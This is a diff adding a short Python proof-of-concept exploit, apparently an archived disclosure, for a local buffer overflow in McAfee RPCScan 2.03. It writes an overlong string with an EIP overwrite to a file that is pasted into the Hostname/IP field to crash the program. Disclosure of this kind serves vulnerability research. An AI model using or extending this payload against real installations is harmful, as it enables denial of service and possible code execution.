@@ -1,0 +1,29 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+#
+# Exploit Title     	: RPCScan v2.03 Hostname/IP Field Local BoF PoC
+# Discovery by      	: Irving Aguilar
+# Email			: im.aguilar@protonmail.ch
+# Discovery Date    	: 05.05.2016
+# Software Link     	: http://www.mcafee.com/us/downloads/free-tools/rpcscan.aspx#
+# Tested Version    	: 2.03
+# Vulnerability Type	: Denial of Service (DoS) Local
+# Tested on OS		: Windows 7 Enterprise SP1 x64 en
+#
+#
+# Steps to Produce the Crash: 
+# 1.- Run python code : python RPCScan-BoF.py
+# 2.- Open RPCScan-BoF.txt and copy content to clipboard
+# 3.- Open RPCScan2.exe
+# 4.- Clic button Ok
+# 5.- Paste Clipboard Scan > Hostname/IP
+# 6.- Clic on add button (->)
+# 7.- Clic button Aceptar
+# 8.- Crashed
+ 
+buffer = "\x41" * 388
+eip = "\x42" * 4
+ 
+f = open ("RPCScan-BoF.txt", "w")
+f.write(buffer + eip)
+f.close()
